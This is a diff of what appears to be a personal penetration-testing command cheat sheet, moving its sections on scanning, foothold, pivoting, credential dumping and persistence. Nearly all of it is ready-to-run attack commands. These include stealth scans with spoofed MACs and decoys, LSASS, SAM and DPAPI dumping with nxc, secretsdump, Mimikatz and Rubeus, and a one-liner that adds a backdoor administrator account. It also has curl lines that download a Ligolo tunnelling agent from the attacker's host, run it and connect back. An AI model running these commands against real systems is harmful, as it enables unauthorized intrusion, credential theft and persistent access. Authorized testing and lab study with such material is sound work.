@@ -69,7 +69,7 @@ sudo nmcli con show $uuid | grep 'ipv4'
 sudo systemctl restart NetworkManager.service
 sudo systemctl restart networking.service
 
-# Discovery
+# Discovery: Hosts and Ports
 ## Nesus
 systemctl status nessusd; systemctl start nessusd; chromium "https://localhost:8834"
 
@@ -98,7 +98,7 @@ sort -nu -t . -k1,1 -k2,2 -k3,3 -k4,4 tmp.hosts | tee hosts_$TARGET__24
 sudo nmap -n -Pn -sS -iL hosts_$TARGET__24 -oA 'TCP_1000_$TARGET__24' --open --min-rate 250 --max-rate 500 -D 1.1.1.1 -g53 --spoof-mac Cloudflare --mtu 32 --data-length 0
 sudo nmap -n -Pn -sS -iL hosts_$TARGET__24 -oA 'TCP_ALL_$TARGET__24' --open --min-rate 250 --max-rate 500 -D 1.1.1.1 -g53 --spoof-mac Cloudflare --mtu 32 --data-length 0 -p-
 
-# Tech and Protocols
+# Foothold: Tech and Protocols
 ## Web
 [*] Web Shell
 +---------- Create ----------+
@@ -977,7 +977,7 @@ xfreerdp3 /v:'$TARGET' /d:'$DOM' /u:'$USERNAME' /p:'$PASSWORD' /cert:ignore /sec
 evil-winrm -i "$TARGET" -u '$USERNAME' -p '$PASSWORD'
 evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'
 
-# Information Gathering (Pre-creds)
+# Foothold: Information Gathering (Pre-creds)
 ## Create Custom Usernames List
 username-anarchy --input-file names --select-format first,flast,f.last,first.last,firstlast | tee usernames_custom
 username-anarchy Joe Kerr --select-format first,flast,f.last,first.last,firstlast | tee usernames_custom
@@ -999,14 +999,13 @@ cat passwords | sort -u | tee passwords
 cat pwned | sort -u | sort -k5,5
 
 ## Web
-bannerme
+whatweb http://$TARGET
+nuclei -u http://$TARGET
 curl -si $TARGET | grep -oP '(?<=https?://)[^/\s]+' | cut -d '"' -f1
 echo | openssl s_client -connect $TARGET:443 2>/dev/null | awk '/subject=|issuer=/'
 domme ://$TARGET
 echo "$TARGET $DOM" | sudo tee -a /etc/hosts # Windows: C:\Windows\System32\drivers\etc\hosts
-creds search pfsense
-creds search tomcat
-URL=http://$DOM; whatweb $URL; nuclei -u $URL
+creds search pfsense; creds search tomcat
 dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --exclude-sizes 0 --exclude-status 404 --recursive --crawl -t 50 -o dirsearch.txt --format json -w /usr/share/wordlists/assetnote/assetnote_directories.txt -u ://$DOM
 ffuf -H "Host: FUZZ.$DOM" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fc 404 -t 50 -rate 5000 -fs 0 -fw 0 -u ://$DOM
 portnock $TARGET 3456 8234 62431 -v
@@ -1036,44 +1035,7 @@ cp hashes /mnt/c/hashcat
 cd /mnt/c/hashcat; hashcat.exe -m 19700 hashes $(wslpath -w $rockyou)
 
 
-# Exploitation (Post-creds)
-## Initial Enumeration
-[*] Bloodhound
-+---------- Start ----------+
-Set-Location "$env:USERPROFILE\Downloads"; docker compose down; docker volume rm @(docker volume ls -q | Select-String neo4j-data); docker compose up
-.\bloodhound-cli resetpwd
-http://127.0.0.1:7474
-neo4j:bloodhoundcommunityedition
-http://127.0.0.1:8080
-admin:RANDOM_PASSWORD
-
-+---------- Queries ----------+
--->> Privileges: Groups with Users and Computers
-MATCH p=(n)-[r*1..]-(m)
-WHERE (n:User OR n:Computer)
-  AND (m:User OR m:Computer)
-  AND ALL(x IN nodes(p) WHERE x:User OR x:Computer)
-RETURN p
-LIMIT 1000
-
-MATCH (g:Group)<-[:MemberOf]-(e)-[r1]->(n1)-[r2]->(n2)
-WHERE (e:User OR e:Computer)
-  AND NOT toLower(e.name) CONTAINS "admin"
-  AND NOT toLower(e.name) CONTAINS "guest"
-  AND NOT toLower(g.name) CONTAINS "admin"
-  AND NOT toLower(g.name) CONTAINS "guest"
-  AND NOT toLower(g.name) CONTAINS "domain users"
-  AND NOT toLower(n1.name) CONTAINS "admin"
-  AND NOT toLower(n1.name) CONTAINS "domain users"
-  AND NOT toLower(n2.name) CONTAINS "admin"
-  AND NOT toLower(n2.name) CONTAINS "domain users"
-  AND NOT (n1:Container AND toLower(n1.name) CONTAINS "users")
-  AND NOT (n2:Container AND toLower(n2.name) CONTAINS "users")
-WITH e, r1, n1, r2, n2
-OPTIONAL MATCH (n2)-[r3]->(connected)
-RETURN DISTINCT e, r1, n1, r2, n2, r3, connected
-LIMIT 1000
-
+# Foothold: Exploitation (Post-creds)
 ## Decoding and Decompressing
 echo -n '6b,cf,2a,4b,6e,5a,ca,0f' | xxd -r -p | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
 echo -n 'cGFzc3dvcmRpc2dvb2Q=' | base64 -d
@@ -1117,10 +1079,43 @@ impacket-smbclient $DOM/'$USERNAME:$PASSWORD'@$TARGET
 impacket-wmiexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
 impacket-atexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
 
-# Persistence: Create and Attack
-## Create Account
-powershell -c "Invoke-Command -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }"
+# Lateral Movement: Pivoting
+## Identify
+Linux:   route; arp -a; ifconfig
+Windows: route print; arp -a; ipconfig /all
 
+## Calculate Range
+ipcalc 172.16.1.0/255.255.255.0
+
+## Ligolo: Setup
+sudo ligolo-proxy -selfcert -laddr 0.0.0.0:8080
+curl $MYIP/linux/agent -o /dev/shm/agent; chmod +x /dev/shm/agent; /dev/shm/agent -ignore-cert -connect $MYIP:8080
+curl $MYIP/windows/agent.exe -o \programdata\agent.exe && C:\programdata\agent.exe -ignore-cert -connect $MYIP:8080
+session 1
+interface_create --name ligolo
+tunnel_start --tun ligolo
+ifconfig
+interface_add_route --name ligolo --route 240.0.0.1/32
+interface_add_route --name ligolo --route 192.168.110.51/24
+
+## Ligolo: Reset
+stop,  interface_delete --name ligolo,  start
+
+## Single Host
+chromium 240.0.0.1:3000
+curl 240.0.0.1:5000
+
+## Identify Hosts
+nbtscan-unixwiz 192.168.110.51/24
+fping -ag 192.168.110.51/24
+sudo masscan -n -Pn '/24' -p21,22,23,25,53,79,80,88,135,139,389,443,445,512,513,514,1433,1521,2049,2375,3306,3389,5985,10249,10250 --open --rate 500 --max-rate 500 -g53 --spoof-mac '6C:45:C4:52:68:5C' --data-length 0 -e 'ligolo' -S '240.0.0.1' | grep -oP "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u | tee hosts_IP__24
+sudo nmap -n -Pn -sS '/24' -p21,22,23,25,53,79,80,88,135,139,389,443,445,512,513,514,1433,1521,2049,2375,3306,3389,5985,10249,10250 --open --min-rate 250 --max-rate 500 -vvvv 2>&1 | stdbuf -oL grep --color=never -oP '(?<=on )\d{1,3}(?:\.\d{1,3}){3}' | tee tmp.hosts; sort -nu -t . -k1,1 -k2,2 -k3,3 -k4,4 tmp.hosts | tee hosts_IP__24
+
+## Port Scan: Default and Full
+sudo nmap -n -Pn -sS -iL hosts_ --open --max-rate 50 -oA 'TCP_IP__24'
+sudo nmap -n -Pn -sS -iL hosts_ --open --max-rate 50 -oA 'TCP_ALL_IP__24'
+
+# Lateral Movement: Credential Dumping
 ## Dump: DPAPI, LSASS, SAM + Secrets
 (t=$TARGET; u=dbf; p='123qweasdF!'; echo '\033[33m--------------[ DPAPI ]--------------\033[0m';nxc smb $t -u $u -p $p --dpapi --local-auth; echo '\033[33m--------------[ LSASS ]--------------\033[0m';nxc smb $t -u $u -p $p -M lsassy --local-auth; echo '\033[33m--------------[ SAM + SECRETS ]--------------\033[0m'; impacket-secretsdump $u:$p@$t) | tee dump_$t
 
@@ -1143,10 +1138,12 @@ impacket-dpapi masterkey -file dpapi/7dc6a492-36e2-4c2d-be66-ba29d263dda2 -sid S
 impacket-dpapi credential -file dpapi/936A68B5AC87C545C4A22D1AF264C8E9 -key 0xdcd70638e50e...
 
 ## Rubeus: Tickets
-winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe dump /nowrap'
-winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe tgtdeleg /nowrap'
-winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe asreproast /nowrap'
-winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe kerberoast /nowrap'
+rlwrap winexe -U 'dbf%123qweasdF!' //$TARGET 'cmd.exe /c powershell'
+C:\Windows\Tasks\Rubeus.exe monitor /interval:5 /nowrap
+C:\Windows\Tasks\Rubeus.exe dump /nowrap
+C:\Windows\Tasks\Rubeus.exe tgtdeleg /nowrap
+C:\Windows\Tasks\Rubeus.exe asreproast /nowrap
+C:\Windows\Tasks\Rubeus.exe kerberoast /nowrap
 
 ## Mimikatz: Dumps+
 rlwrap winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\mimikatz.exe'
@@ -1157,6 +1154,10 @@ lsadump::secrets
 vault::list
 vault::cred /patch
 sekurlsa::dpapi
+
+# Persistence: Create Account
+## Create Account
+powershell -c "Invoke-Command -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }"
 
 # Post-Exploitation 
 ## Linux
@@ -1331,38 +1332,6 @@ find / -name 'root.txt' -readable -exec echo {} \; -exec cat {} \; 2>/dev/null
 
 +---------- /etc/shadow ----------+
 cat /etc/shadow
-
-[*] Pivoting
-+---------- Identify Routes ----------+
-route
-ipcalc 172.16.1.0/255.255.255.0
-
-+---------- Ligolo: New Configuration ----------+
-sudo ligolo-proxy -selfcert -laddr 0.0.0.0:8080
-curl $MYIP/linux/agent -o /dev/shm/agent; chmod +x /dev/shm/agent; /dev/shm/agent -ignore-cert -connect $MYIP:8080
-session 1
-interface_create --name ligolo
-tunnel_start --tun ligolo
-ifconfig
-interface_add_route --name ligolo --route 240.0.0.1/32
-interface_add_route --name ligolo --route 192.168.110.51/24
-
-+---------- Ligolo: Reset ----------+
-stop,  interface_delete --name ligolo,  start
-
-+---------- Single Host ----------+
-chromium 240.0.0.1:3000
-curl 240.0.0.1:5000
-
-+---------- Identify Multiple Hosts ----------+
-nbtscan-unixwiz 192.168.110.51/24
-fping -ag 192.168.110.51/24
-sudo masscan -n -Pn '/24' -p21,22,23,25,53,79,80,88,135,139,389,443,445,512,513,514,1433,1521,2049,2375,3306,3389,5985,10249,10250 --open --rate 500 --max-rate 500 -g53 --spoof-mac '6C:45:C4:52:68:5C' --data-length 0 -e 'ligolo' -S '240.0.0.1' | grep -oP "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u | tee hosts_IP__24
-sudo nmap -n -Pn -sS '/24' -p21,22,23,25,53,79,80,88,135,139,389,443,445,512,513,514,1433,1521,2049,2375,3306,3389,5985,10249,10250 --open --min-rate 250 --max-rate 500 -vvvv 2>&1 | stdbuf -oL grep --color=never -oP '(?<=on )\d{1,3}(?:\.\d{1,3}){3}' | tee tmp.hosts; sort -nu -t . -k1,1 -k2,2 -k3,3 -k4,4 tmp.hosts | tee hosts_IP__24
-
-+---------- Port Scan: Default and Full ----------+
-sudo nmap -n -Pn -sS -iL hosts_ --open --max-rate 50 -oA 'TCP_IP__24'
-sudo nmap -n -Pn -sS -iL hosts_ --open --max-rate 50 -oA 'TCP_ALL_IP__24'
 
 [*] Meterpreter
 msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg USERNAME $USERNAME; setg PASSWORD $PASSWORD; setg SESSION 1; setg PAYLOAD linux/x64/meterpreter/bind_tcp; setg PAYLOAD_OVERRIDE linux/x64/meterpreter/bind_tcp; setg PLATFORM_OVERRIDE linux; setg PSH_ARCH_OVERRIDE x64; run; background; use post/multi/manage/shell_to_meterpreter; run'
@@ -1546,38 +1515,6 @@ takeown /f "C:\secret.txt" && icacls "C:\secret.txt" /grant %USERNAME%:F /inheri
 +---------- Scheduled Tasks ----------+
 powershell -c "$task = Get-ScheduledTask -TaskName 'Ownership'; $task.Actions; $task.Triggers; $task.Settings; $task | Format-List *"
 powershell -c "Start-ScheduledTask -TaskName 'Ownership'"
-
-[*] Pivoting
--->> Identify Routes
-print route
-ipcalc 172.16.1.0/255.255.255.0
-
--->> Ligolo: New Configuration
-sudo ligolo-proxy -selfcert -laddr 0.0.0.0:8080
-curl $MYIP/windows/agent.exe -o \programdata\agent.exe && C:\programdata\agent.exe -ignore-cert -connect $MYIP:8080
-session 1
-interface_create --name ligolo
-tunnel_start --tun ligolo
-ifconfig
-interface_add_route --name ligolo --route 240.0.0.1/32
-interface_add_route --name ligolo --route 192.168.110.51/24
-
--->> Ligolo: Reset
-stop,  interface_delete --name ligolo,  start
-
--->> Single Host
-chromium 240.0.0.1:3000
-curl 240.0.0.1:5000
-
--->> Identify Multiple Hosts
-nbtscan-unixwiz 192.168.110.51/24
-fping -ag 192.168.110.51/24
-sudo masscan -n -Pn '/24' -p21,22,23,25,53,79,80,88,135,139,389,443,445,512,513,514,1433,1521,2049,2375,3306,3389,5985,10249,10250 --open --rate 500 --max-rate 500 -g53 --spoof-mac '6C:45:C4:52:68:5C' --data-length 0 -e 'ligolo' -S '240.0.0.1' | grep -oP "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u | tee hosts_IP__24
-sudo nmap -n -Pn -sS '/24' -p21,22,23,25,53,79,80,88,135,139,389,443,445,512,513,514,1433,1521,2049,2375,3306,3389,5985,10249,10250 --open --min-rate 250 --max-rate 500 -vvvv 2>&1 | stdbuf -oL grep --color=never -oP '(?<=on )\d{1,3}(?:\.\d{1,3}){3}' | tee tmp.hosts; sort -nu -t . -k1,1 -k2,2 -k3,3 -k4,4 tmp.hosts | tee hosts_IP__24
-
--->> Port Scan: Default and Full
-sudo nmap -n -Pn -sS -iL hosts_ --open --max-rate 50 -oA 'TCP_IP__24'
-sudo nmap -n -Pn -sS -iL hosts_ --open --max-rate 50 -oA 'TCP_ALL_IP__24'
 
 [*] Meterpreter
 +---------- Initial Shell ----------+
